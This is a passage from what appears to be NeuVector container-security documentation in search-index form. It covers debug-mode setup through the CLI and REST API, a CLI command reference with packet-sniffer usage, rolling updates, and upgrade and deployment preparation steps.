 To download the support log, go to Settings -&gt; Configuration and select Collect Log.  ","version":"5.2","tagName":"h3"},{"title":"Using the CLI to turn on Debug Mode​","type":1,"pageTitle":"Troubleshooting","url":"/5.2/troubleshooting/troubleshooting#using-the-cli-to-turn-on-debug-mode","content":" Login to NeuVector manager pod with user and password (recommended in a separate terminal window).  kubectl exec -it neuvector-manager-pod-5bb76b6754-rlmnp -n neuvector -- cli   #neuvector-svc-controller.neuvector&gt; login   Get the list of controllers. Find the controller with the Leader = True.  show controller   Turn on the debug mode in the leader controller using the ID or name of controller  set controller 4fce427cf963 debug -c all   To turn on debug mode on all controllers  set system controller_debug -c all   Perform the activity in NeuVector which you wish to debug. Then view the controller logs (in a separate terminal window).  kubectl logs &lt;leader_controller_pod_name&gt; -n neuvector   If required, capture the logs and send them to NeuVector.  Turn off Debug mode on the controller (back in the CLI window).  set controller 4fce427cf963 debug exit   Check controller debug status.  show controller setting 289d67396fcb   ","version":"5.2","tagName":"h3"},{"title":"Using the REST API to turn on Debug Mode​","type":1,"pageTitle":"Troubleshooting","url":"/5.2/troubleshooting/troubleshooting#using-the-rest-api-to-turn-on-debug-mode","content":" Set access token with your IP, user, password:  _controllerIP_=&quot;&lt;your_controller_ip&gt;&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot;   note For Kubernetes based deployments you can get the Controller IP in the following command output:  kubectl get pod -n neuvector -o wide | grep controller   note If accessing the REST API from outside the cluster, see the Automation section instructions.  Get the authentication token  curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'`   note You may need to install jq ($sudo yum install jq)  Enable Debug Mode  curl -X PATCH -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;controller_debug&quot;: [&quot;cpath&quot;, &quot;conn&quot;]}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; set_debug.json #debug options - cpath, conn, mutex, scan, cluster , all   Disable Debug on all controllers in a cluster  curl -X PATCH -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;controller_debug&quot;: []}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; set_debug.json   Check the controller debug status in a cluster  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; system_setting.json cat system_setting.json | jq .config.controller_debug   Logout  echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1  ","version":"5.2","tagName":"h3"},{"title":"Automating NeuVector","type":0,"sectionRef":"#","url":"/next/automation","content":"Automating NeuVector NeuVector can be integrated into the CI/CD workflow to provide automated scanning and deployment. We provide examples of using the REST API to automate NeuVector deployment.","keywords":"","version":"Next 🚧"},{"title":"Command Line","type":0,"sectionRef":"#","url":"/5.2/tronubleshooting/cli","content":"","keywords":"","version":"5.2"},{"title":"Using the NeuVector Command Line​","type":1,"pageTitle":"Command Line","url":"/5.2/tronubleshooting/cli#using-the-neuvector-command-line","content":" The NeuVector solution supports a limited set of functions using the CLI. The CLI is supported through the Manager, which in turn uses a RestAPI to issue commands to the Controller. The Controller then manages the Enforcer(s) appropriately. A complete set of operations is supported through the REST API, which can be exposed directly from the Controller. You can access the NeuVector CLI by typing the cli command for the Manager or Allinone, for example:  kubectl exec -it neuvector-manager-pod-5bb76b6754-rlmnp -n neuvector -- cli   docker exec -it allinone cli   Where ‘allinone’ is the container name for the Controller. You may need to use the container ID for the name.  Although the CLI is available through the Manager, we recommend using the REST API directly into the controller for querying and automation.  CLI Command Examples​  Here are some of the most common CLI commands:  &gt; login &gt; logout   Use the same user/password you use for the console.  &gt; show policy -h Usage: cli show policy [OPTIONS] COMMAND [ARGS]...   &gt; create policy rule -h Usage: cli create policy rule [OPTIONS] FROM TO &gt; delete policy rule -h Usage: cli delete policy rule [OPTIONS] ID   &gt; show log -h Usage: cli show log [OPTIONS] COMMAND [ARGS]...   &gt; set system policy_mode -h Usage: cli set system policy_mode [OPTIONS] MODE Set system policy mode. Options: -h, --help Show this message and exit. MODES: learn=discover evaluate=monitor enforce=protect   &gt; set controller &lt;leader_controller_id&gt; debug -c cpath Turn on debug mode.   &gt; set controller &lt;leader_controller_id&gt; debug Turn off debug mdoe.   More CLI commands are listed below.  ","version":"5.2","tagName":"h3"},{"title":"Command Line Reference & Commands​","type":1,"pageTitle":"Command Line","url":"/5.2/tronubleshooting/cli#command-line-reference--commands","content":" ","version":"5.2","tagName":"h2"},{"title":"Login/Logout​","type":1,"pageTitle":"Command Line","url":"/5.2/tronubleshooting/cli#loginlogout","content":" &gt; login -h Usage: cli login [OPTIONS] Login and obtain an authentication token. Options: --username TEXT --password TEXT -h, --help Show this message and exit.   &gt; logout -h Usage: cli logout [OPTIONS] Clear local authentication credentials. Options: -h, --help Show this message and exit.   &gt; exit -h Usage: cli exit [OPTIONS] Exit CLI. Options: -h, --help Show this message and exit.   ","version":"5.2","tagName":"h3"},{"title":"User​","type":1,"pageTitle":"Command Line","url":"/5.2/tronubleshooting/cli#user","content":" &gt; create user -h Usage: cli create user [OPTIONS] USERNAME ROLE Create user. Options: --email TEXT --locale TEXT --password TEXT --password2 TEXT -h, --help Show this message and exit.   &gt; set user -h Usage: cli set user [OPTIONS] USERNAME COMMAND [ARGS]... Set user configuration. Options: -h, --help Show this message and exit. Commands: local Set local user. remote Set remote user.   &gt; unset user -h Usage: cli unset user [OPTIONS] USERNAME COMMAND [ARGS]... Unset user configuration. Options: -h, --help Show this message and exit. Commands: local Unset local user. remote Unset remote user.   &gt; delete user -h Usage: cli delete user [OPTIONS] USERNAME Delete user. Options: -h, --help Show this message and exit.   ","version":"5.2","tagName":"h3"},{"title":"Policy​","type":1,"pageTitle":"Command Line","url":"/5.2/tronubleshooting/cli#policy","content":" &gt; create group -h Usage: cli create group [OPTIONS] NAME Create group. For --lable, use format: key,value. If the option value starts with @, the criterion matches string with substring 'value'. Options: --image TEXT container image name. --node TEXT node name. --container TEXT container workload name. --application TEXT container application name. --label TEXT container label. -h, --help Show this message and exit.   &gt; set group -h Usage: cli set group [OPTIONS] NAME Set group configuration. For --lable, use format: key,value. If the option value starts with @, the criterion matches string with substring 'value'. Options: --image TEXT container image name. --node TEXT node name. --container TEXT container workload name. --application TEXT container application name. --label TEXT container label. -h, --help Show this message and exit.   &gt; delete group -h Usage: cli delete group [OPTIONS] NAME Delete group. Options: -h, --help Show this message and exit.   &gt; create policy rule -h Usage: cli create policy rule [OPTIONS] FROM TO Create and append policy rule, with unique rule id (&lt; 10000). Options: --id INTEGER Policy rule ID. (Optional) --ports TEXT Port list. eg: any or 80,8080,8500-8508,tcp/443,tcp/3306-3307,udp/53 --applications TEXT Application list. eg: http,kafka --action [allow|deny] --after INTEGER Specify policy rule ID that the new rule is inserted after. Use 0 to insert to the first. --comment TEXT -h, --help Show this message and exit.   &gt; set policy rule -h Usage: cli set policy rule [OPTIONS] ID Configure policy rule. Options: --from TEXT --to TEXT --ports TEXT Port list. eg: any or 80,8080,8500-8508,tcp/443,tcp/3306-3307,udp/53 --applications TEXT Application list. eg: http,kafka --action [allow|deny] --after INTEGER Specify policy rule ID that the new rule is inserted after. Use 0 to insert to the first. --comment TEXT -h, --help Show this message and exit.   &gt; delete policy rule -h Usage: cli delete policy rule [OPTIONS] ID Delete policy rule. Options: -h, --help Show this message and exit.   &gt; show service -h Usage: cli show service [OPTIONS] COMMAND [ARGS]... Show service Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: detail Show service detail.   &gt; set service -h Usage: cli set service [OPTIONS] NAME COMMAND [ARGS]... Set service configuration. Options: -h, --help Show this message and exit. Commands: policy_mode Set service policy mode [discover, monitor, protect]   &gt; set system new_service policy_mode -h SEE System (below)   ","version":"5.2","tagName":"h3"},{"title":"Quarantine​","type":1,"pageTitle":"Command Line","url":"/5.2/tronubleshooting/cli#quarantine","content":" &gt; set container Usage: cli set container [OPTIONS] ID_OR_NAME COMMAND [ARGS]... Set container configuration. Options: -h, --help Show this message and exit. Commands: quarantine Set container quarantine state.   ","version":"5.2","tagName":"h3"},{"title":"System​","type":1,"pageTitle":"Command Line","url":"/5.2/tronubleshooting/cli#system","content":" &gt; set system -h Usage: cli set system [OPTIONS] COMMAND [ARGS]... Set system configuration. Options: -h, --help Show this message and exit. Commands: new_service policy_mode Set system policy mode. syslog Set syslog server IP and port (1.2.3.4:514)   &gt; set system syslog -h Usage: cli set system syslog [OPTIONS] COMMAND [ARGS]... Set syslog settings Options: -h, --help Show this message and exit. Commands: category syslog categories... level Set syslog level server Set syslog server IP and port (1.2.3.4:514) status Enable/disable syslog   &gt; set system new_service policy_mode -h Usage: cli set system new_service policy_mode [OPTIONS] MODE Set system new service policy mode. Options: -h, --help Show this message and exit. MODES: discover monitor protect   &gt; unset system Usage: cli unset system [OPTIONS] COMMAND [ARGS]... Unset system configuration. Options: -h, --help Show this message and exit. Commands: syslog_server Unset syslog server address.   ","version":"5.2","tagName":"h3"},{"title":"Vulnerability Scan​","type":1,"pageTitle":"Command Line","url":"/5.2/tronubleshooting/cli#vulnerability-scan","content":" &gt; set scan auto -h Usage: cli set scan auto [OPTIONS] AUTO Set scanner mode. Options: -h, --help Show this message and exit. AUTO: enable disable   &gt; request scan container -h Usage: cli request scan container [OPTIONS] ID_OR_NAME Request to scan one container Options: -h, --help Show this message and exit.   &gt; request scan node -h Usage: cli request scan node [OPTIONS] ID_OR_NAME Request to scan one node Options: -h, --help Show this message and exit.   &gt; show scan container -h Usage: cli show scan container [OPTIONS] Show scan container summary Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. --node TEXT list scan result on a given node --first INTEGER list the first n scan result, default is list all -h, --help Show this message and exit.   &gt; show scan node -h Usage: cli show scan node [OPTIONS] Show scan node summary Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. --first INTEGER list the first n scan result, default is list all -h, --help Show this message and exit.   &gt; show scan image -h Usage: cli show scan image [OPTIONS] Show scan image summary Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. --first INTEGER list the first n scan result, default is list all -h, --help Show this message and exit.   &gt; show scan report container -h Usage: cli show scan report container [OPTIONS] ID_OR_NAME Show scan container detail report Options: -h, --help Show this message and exit.   &gt; show scan report image -h Usage: cli show scan report image [OPTIONS] NAME Show scan image detail report Options: -h, --help Show this message and exit.   &gt; show scan report node -h Usage: cli show scan report node [OPTIONS] ID_OR_NAME Show scan node detail report Options: -h, --help Show this message and exit.   ","version":"5.2","tagName":"h3"},{"title":"Show/Debug commands​","type":1,"pageTitle":"Command Line","url":"/5.2/tronubleshooting/cli#showdebug-commands","content":" &gt; show container -h Usage: cli show container [OPTIONS] COMMAND [ARGS]... Show container. Options: -b, --brief brief output --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: detail Show container detail. setting show container configurations. stats Show container statistics.   &gt; show enforcer -h Usage: cli show enforcer [OPTIONS] COMMAND [ARGS]... Show enforcer. Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: counter Show enforcer counters. detail Show enforcer detail. setting show enforcer configurations. stats Show enforcer statistics.   &gt; show conversation -h Usage: cli show conversation [OPTIONS] COMMAND [ARGS]... Show conversations. Options: -g, --group TEXT filter conversations by group --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: pair Show conversation detail between a pair of...   &gt; show controller -h Usage: cli show controller [OPTIONS] COMMAND [ARGS]... Show controller. Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: detail Show controller detail. setting show controller configurations.   &gt; show group -h Usage: cli show group [OPTIONS] COMMAND [ARGS]... Show group. Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: detail Show group detail.   &gt; show log -h Usage: cli show log [OPTIONS] COMMAND [ARGS]... Log operations. Options: -h, --help Show this message and exit. Commands: event List events. threat List threats. violation List policy violations.   &gt; show node -h Usage: cli show node [OPTIONS] COMMAND [ARGS]... Show node. Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: bench Show node bench. detail Show node detail. ip_2_container Show node ip-container map.   &gt; show policy -h Usage: cli show policy [OPTIONS] COMMAND [ARGS]... Show policy. Options: -h, --help Show this message and exit. Commands: derived List derived policy rules rule Show policy rule.   &gt; show session -h Usage: cli show session [OPTIONS] COMMAND [ARGS]... Show sessions. Options: -h, --help Show this message and exit. Commands: list list session. summary show session summary.   &gt; show system -h Usage: cli show system [OPTIONS] COMMAND [ARGS]... System operations. Options: -h, --help Show this message and exit. Commands: setting Show system configuration. summary Show system summary.   &gt; show user -h Usage: cli show user [OPTIONS] COMMAND [ARGS]... Show user. Options: -h, --help Show this message and exit.   &gt; set enforcer -h Usage: cli set enforcer [OPTIONS] ID_OR_NAME COMMAND [ARGS]... Set enforcer configuration. Options: -h, --help Show this message and exit. Commands: debug Configure enforcer debug.   &gt; delete conversation pair -h Usage: cli delete conversation pair [OPTIONS] CLIENT SERVER Delete conversations between a pair of containers. Options: -h, --help Show this message and exit.   &gt; delete session -h Usage: cli delete session [OPTIONS] clear session. Options: -e, --enforcer TEXT filter sessions by enforcer --id TEXT filter sessions by session id -h, --help Show this message and exit.   ","version":"5.2","tagName":"h3"},{"title":"Export/Import​","type":1,"pageTitle":"Command Line","url":"/5.2/tronubleshooting/cli#exportimport","content":" &gt; request export config -h Usage: cli request export config [OPTIONS] Export system configurations. Options: -s, --section [user|policy] -f, --filename PATH -h, --help Show this message and exit.   &gt; request import config -h Usage: cli request import config [OPTIONS] FILENAME Import system configurations. Options: -h, --help Show this message and exit.   Packet Sniffer​  note Sniffer files are stored in the /var/neuvector/pcap directory in the Enforcer container. Make sure you map the volume to your guest machine directory or local system directory to be able to access the files. For example in the docker-compose file add ‘- /var/neuvector:/var/neuvector’ in volumes.  To start packet capture on a pod, you will need to know the containerID to pass into the ID_OR_NAME field. You can do this with show container -c &lt;container_name&gt;. then start the sniffer with request sniffer start &lt;container_id&gt;. For example,  admin#neuvector-svc-controller.neuvector&gt; show container -c pos-test +--------------+-----------------------------------------------------------------------+-------------+---------------------------------------+----------+--------------+----------------------+------------------------+ | id | name | host_name | image | state | applications | started_at | interfaces | +--------------+-----------------------------------------------------------------------+-------------+---------------------------------------+----------+--------------+----------------------+------------------------+ | fc0b5458db1a | k8s_POD_pos-test_pos-test_bd3e2c9d-847a-4bcd-ac76-cb6fa651a8d2_0 | gtk8s-node2 | k8s.gcr.io/pause:3.2 | discover | [] | 2021-09-24T15:36:05Z | eth0:192.168.128.22/32 | | 0f48441a21cd | k8s_POD_pos-test_pos-test_c405efe5-f767-4fbf-b424-ea3106d9ec62_0 | gtk8s-node1 | k8s.gcr.io/pause:3.2 | exit | [] | 2021-09-23T23:53:56Z | {} | | 8ddb6052f2d1 | k8s_pos-test_pos-test_pos-test_bd3e2c9d-847a-4bcd-ac76-cb6fa651a8d2_0 | gtk8s-node2 | docker.io/garricktam/jmeter-pos:5.4.1 | discover | [] | 2021-09-24T15:36:40Z | eth0:192.168.128.22/32 | +--------------+-----------------------------------------------------------------------+-------------+---------------------------------------+----------+--------------+----------------------+------------------------+ admin#neuvector-svc-controller.neuvector&gt; request sniffer start 8ddb6052f2d1 admin#neuvector-svc-controller.neuvector&gt; show sniffer -c 8ddb6052f2d1 Total sniffers: 2 +--------------------------------------------------------------------------+---------+--------------+--------------+------+-------------+ | id | status | enforcer_id | container_id | size | file_number | +--------------------------------------------------------------------------+---------+--------------+--------------+------+-------------+ | 01119c164ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 | stopped | 4ab9cc73178f | 8ddb6052f2d1 | 24 | 1 | | 1f0702444ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 | running | 4ab9cc73178f | 8ddb6052f2d1 | 24 | 1 | +--------------------------------------------------------------------------+---------+--------------+--------------+------+-------------+ admin#neuvector-svc-controller.neuvector&gt; request sniffer stop 1f0702444ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 admin#neuvector-svc-controller.neuvector&gt; show sniffer -c 8ddb6052f2d1 Total sniffers: 2 +--------------------------------------------------------------------------+---------+--------------+--------------+-------+-------------+ | id | status | enforcer_id | container_id | size | file_number | +--------------------------------------------------------------------------+---------+--------------+--------------+-------+-------------+ | 01119c164ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 | stopped | 4ab9cc73178f | 8ddb6052f2d1 | 24 | 1 | | 1f0702444ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 | stopped | 4ab9cc73178f | 8ddb6052f2d1 | 20165 | 1 | +--------------------------------------------------------------------------+---------+--------------+--------------+-------+-------------+   important If the duration is not set, you will need to find the sniffer ID in order to stop the sniffer. To do this, show sniffer -c &lt;containerID&gt;. Follow by request sniffer stop &lt;sniffer_ID&gt;.  Command options:  request sniffer start -h Usage: cli request sniffer start [OPTIONS] Start sniffer. Options: -e, --enforcer TEXT Add sniffer by enforcer -c, --container TEXT Add sniffer by container -f, --file_number INTEGER Maximum number of rotation files -s, --file_size INTEGER Maximum size (in MB) of rotation files -o, --options TEXT Sniffer filter -h, --help Show this message and exit.   show sniffer -h Usage: cli show sniffer [OPTIONS] COMMAND [ARGS]... Show sniffer. Options: -e, --enforcer TEXT Show sniffers by enforcer -h, --help Show this message and exit.   request sniffer stop -h Usage: cli request sniffer stop [OPTIONS] ID Stop sniffer. You may need to include both the enforcer ID and the container ID. Options: -e, --enforcer TEXT Delete sniffer by enforcer -h, --help Show this message and exit.  ","version":"5.2","tagName":"h3"},{"title":"Updating NeuVector","type":0,"sectionRef":"#","url":"/5.2/updating/updating","content":"","keywords":"","version":"5.2"},{"title":"Updating NeuVector Components​","type":1,"pageTitle":"Updating NeuVector","url":"/5.2/updating/updating#updating-neuvector-components","content":" It’s super easy to update your NeuVector containers. If there is a new release available, pull it from Docker Hub. It is recommended to use a ‘rolling update’ strategy to keep at least one Allinone or Controller container running at any time during an update.  imporant Host OS updates, reboots, and orchestrator updates can cause pods to be evicted or stopped. If a Controller is affected, and there are no other Controllers active to maintain the state, the Controllers can become available for some time while new controllers are started, a cluster is formed with a leader, and the persistent storage backup of the configuration is attempted to be accessed to restore the cluster. Be careful when scheduling host or orchestrator updates and reboots which may affect the number of controllers available at any time. See the Pod Disruption Budget below for possible ways to mitigate this. If deployment was done using the NeuVector Helm charts, updating will take care of additional services, rolebindings or other upgrade requirements. If updates are done manually or there is only one Allinone or Controller running, please note that current network connection data is NOT stored and will be lost when the NeuVector container is stopped. NeuVector supports persistent data for the NeuVector policy and configuration. This configures a real-time backup to mount a volume at /var/neuvector/. The primary use case is when the persistent volume is mounted, the configuration and policy are stored during run-time to the persistent volume. In the case of total failure of the cluster, the configuration is automatically restored when the new cluster is created. Configuration and policy can also be manually restored or removed from the /var/neuvector/ volume.  important If a persistent volume is not mounted, NeuVector does NOT store the configuration or policy as persistent data. Be sure to backup the Controller configuration and policy before stopping the allinone or controller container. This can be done in Settings -&gt; Configuration. Alternatively, the controller can be deployed in an HA configuration with 3 or 5 controllers running, in which case the policy will persist with other controllers while one is being updated.  To manually update NeuVector using docker-compose:  sudo docker-compose -f &lt;filename&gt; down   Note that if no filename is specified then the docker-compose.yml file is used.  Make sure the docker-compose.yml or other appropriate file is edited with the desired image version, if necessary, then:  $sudo docker-compose -f &lt;filename&gt; up -d   note We recommend that all NeuVector components be updated to the most recent version at the same time. Backward compatibility is supported for at least one minor version back. Although most older versions will be backward compatible, there may be exceptions which cause unexpected behavior.  ","version":"5.2","tagName":"h3"},{"title":"Rolling Updates​","type":1,"pageTitle":"Updating NeuVector","url":"/5.2/updating/updating#rolling-updates","content":" Orchestration tools such as Kubernetes, RedHat OpenShift, and Rancher support rolling updates with configurable policies. You can use this feature to update the NeuVector containers. The most important will be to ensure that there is at least one Allinone/Controller running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 30 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  Sample Kubernetes Rolling Update​  If your Deployment or Daemonset is already running, you can change the yaml file to the new version, then apply the update:  kubectl apply -f &lt;yaml file&gt;   To update to a new version of NeuVector from the command line.  kubectl set image deployment/neuvector-controller-pod neuvector-controller-pod=neuvector/controller:4.2.2 -n neuvector kubectl set image deployment/neuvector-manager-pod neuvector-manager-pod=neuvector/manager:4.2.2 -n neuvector kubectl set image DaemonSet/neuvector-enforcer-pod neuvector-enforcer-pod=neuvector/enforcer:4.2.2 -n neuvector   To check the status of the rolling update:  kubectl rollout status -n neuvector ds/neuvector-enforcer pod kubectl rollout status -n neuvector deployment/neuvector-controller-pod # same for manager, scanner etc   To rollback the update:  kubectl rollout undo -n neuvector ds/neuvector-enforcer-pod kubectl rollout undo -n neuvector deployment/neuvector-controller-pod # same for manager, scanner etc   ","version":"5.2","tagName":"h3"},{"title":"Updating the Vulnerability CVE Database​","type":1,"pageTitle":"Updating NeuVector","url":"/5.2/updating/updating#updating-the-vulnerability-cve-database","content":" The NeuVector Scanner image is regularly updated on neuvector with new CVE database updates, using the 'latest' tag.  The default NeuVector deployment includes deployment of scanner pods as well as an Updater cron job to update the scanners every day.  Please see the section Updating the CVE Database for more details.  The CVE database version can be seen in the Console in the Vulnerabilities tab. You can also inspect the Updater container image. The latest database version number can also be found listed here.  docker inspect neuvector/updater   &quot;Labels&quot;: { &quot;neuvector.image&quot;: &quot;neuvector/updater&quot;, &quot;neuvector.role&quot;: &quot;updater&quot;, &quot;neuvector.vuln_db&quot;: &quot;1.255&quot; }   You can also inspect the controller/allinone logs for 'version.' For example in Kubernetes:  kubectl logs neuvector-controller-pod-777fdc5668-4jkjn -n neuvector | grep version   2019-07-29T17:04:02.43 |DEBU|SCN|main.dbUpdate: New DB found - create=2019-07-24T11:59:13Z version=1.576 2019-07-29T17:04:02.454|DEBU|SCN|memdb.ReadCveDb: New DB found - update=2019-07-24T11:59:13Z version=1.576 2019-07-29T17:04:12.224|DEBU|SCN|main.scannerRegister: - version=1.576   ","version":"5.2","tagName":"h3"},{"title":"Pod Disruption Budget​","type":1,"pageTitle":"Updating NeuVector","url":"/5.2/updating/updating#pod-disruption-budget","content":" A Kubernetes feature allows for ensuring that a minimum number of controllers are running at any time. This is useful for node draining or other maintenance activities that could remove controller pods. For example, create and apply the file below nv_pdb.yaml to ensure that there are at least 2 controllers running at any time.  apiVersion: policy/v1beta1 kind: PodDisruptionBudget metadata: name: neuvector-controller-pdb namespace: neuvector spec: minAvailable: 2 selector: matchLabels: app: neuvector-controller-pod   ","version":"5.2","tagName":"h3"},{"title":"Upgrading from NeuVector 4.x to 5.1.x​","type":1,"pageTitle":"Updating NeuVector","url":"/5.2/updating/updating#upgrading-from-neuvector-4x-to-51x","content":" Upgrade first to a 5.1.x release such as 5.1.3, then see the Kubernetes deployment section for updating to 5.2.x+ for important changes to services accounts and bindings.  For Helm users, update to NeuVector Helm chart 2.0.0 or later (prior to NeuVector 5.2.0). If updating an Operator or Helm install on OpenShift, see note below.  Delete old neuvector-binding-customresourcedefinition clusterrole  kubectl delete clusterrole neuvector-binding-customresourcedefinition   Apply new update verb for neuvector-binding-customresourcedefinition clusterrole  kubectl create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions   Delete old crd schema for Kubernetes 1.19+  kubectl delete -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/crd-k8s-1.19.yaml   Create new crd schema for Kubernetes 1.19+  kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/waf-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/dlp-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/admission-crd-k8s-1.19.yaml   Create a new DLP, WAP, Admission clusterrole and clusterrolebinding  kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=list,delete --resource=nvadmissioncontrolsecurityrules kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvdlpsecurityrules --verb=list,delete --resource=nvdlpsecurityrules kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:default   Update image names and paths for pulling NeuVector images from Docker hub (docker.io). The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example:  neuvector/manager:5.1.3neuvector/controller:5.1.3neuvector/enforcer:5.1.3neuvector/scanner:latestneuvector/updater:latest  Optionally, remove any references to the NeuVector license and secrets in Helm charts, deployment yaml, configmap, scripts etc, as these are no longer required to pull the images or to start using NeuVector.  Note about SCC and Upgrading via Operator/Helm  Privileged SCC is added to the Service Account specified in the deployment yaml by Operator version 1.3.4 and above in new deployments. In the case of upgrading the NeuVector Operator from a previous version to 1.3.4 or Helm to 2.0.0, please delete Privileged SCC before upgrading.  oc delete rolebinding -n neuvector system:openshift:scc:privileged  ","version":"5.2","tagName":"h3"},{"title":"NeuVector Workflow","type":0,"sectionRef":"#","url":"/next/automation/ci_workflow","content":"","keywords":"","version":"Next 🚧"},{"title":"NeuVector Integration into CI/CD Workflow​","type":1,"pageTitle":"NeuVector Workflow","url":"/next/automation/ci_workflow#neuvector-integration-into-cicd-workflow","content":" NeuVector supports the entire CI/CD process and can be easily integrated into the workflow to provide security throughout the development and deployment process.  Dev and Continuous Integration Workflow​  NeuVector can be integrated into the Dev and CI processes to automate vulnerability scanning. The use of the NeuVector Jenkins plug-in and Registry scanning functions enable image scanning during this phase.    In addition, NeuVector can be used during automated application testing to analyze network connections and container behavior to anticipate any issues in staging or production.  Continuous Deployment and Production Workflow​  NeuVector can conduct pre-deployment compliance testing and security auditing prior to production as well as in production.    The multi-vector security platform is able to combine network security, container inspections, and host security to protect containers at run-time. ","version":"Next 🚧","tagName":"h3"},{"title":"Installation / Deployment","type":0,"sectionRef":"#","url":"/next/basics/installation","content":"Installation / Deployment Deploy the NeuVector containers using Kubernetes, OpenShift, Rancher, AWS EKS, Azure AKS, Google GKE, IBM IKS, docker run, or docker-compose.","keywords":"","version":"Next 🚧"},{"title":"Deployment Preparation","type":0,"sectionRef":"#","url":"/next/basics/installation/native","content":"","keywords":"","version":"Next 🚧"},{"title":"Understanding How to Deploy NeuVector​","type":1,"pageTitle":"Deployment Preparation","url":"/next/basics/installation/native#understanding-how-to-deploy-neuvector","content":" Deploy the NeuVector containers using Kubernetes, OpenShift, Rancher, Docker, or other platforms. Each type of NeuVector container has a unique purpose and may require special performance or node selection requirements for optimum operation.  The NeuVector open source images are hosted on Docker Hub at /neuvector/{image name}.  See the Onboarding/Best Practices section to download an on boarding guide.  Deploy using Kubernetes, OpenShift, Rancher, or other Kubernetes-based tools​  To deploy NeuVector using Kubernetes, OpenShift, Rancher or other orchestration tools, see the preparation steps and sample files in the section Deploying NeuVector. This deploys manager, controller, scanner, and enforcer containers. For simple testing using the NeuVector Allinone container, see the section Special Use Cases with Allinone.  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  Automated deployments are supported using Helm, Red Hat/Community Operators, the rest API, or a Kubernetes ConfigMap. See the section Deploy Using ConfigMap for more details on automating deployment.  Deploy using Docker Native​  Before you deploy NeuVector with docker run or compose, you MUST set the CLUSTER_JOIN_ADDR to the appropriate IP address. Find the node IP address, node name (if using a name server, or node variable (if using orchestration tools) for the allinone (controller) to use for the “node IP” in the docker-compose files for both allinone and enforcer. For example:  - CLUSTER_JOIN_ADDR=192.168.33.10   For Swarm-Based deployments, also add the following environment variable:  - NV_PLATFORM_INFO=platform=Docker   See the section Deploying NeuVector -&gt; Docker Production Deployment for instructions and examples.  Backing Up Configuration Files​  By default NeuVector stores various config files in /var/neuvector/config/backup on the Controller or Allinone node.  This volume can be mapped to persistent storage to maintain configuration. Files in the folder may need to be deleted in order to start fresh.  Volume Mapping​  Make sure volumes are mapped properly. NeuVector requires these to operate (/var/neuvector is only required on controller/allinone). For example:  volumes: - /lib/modules:/lib/modules:ro - /var/neuvector:/var/neuvector - 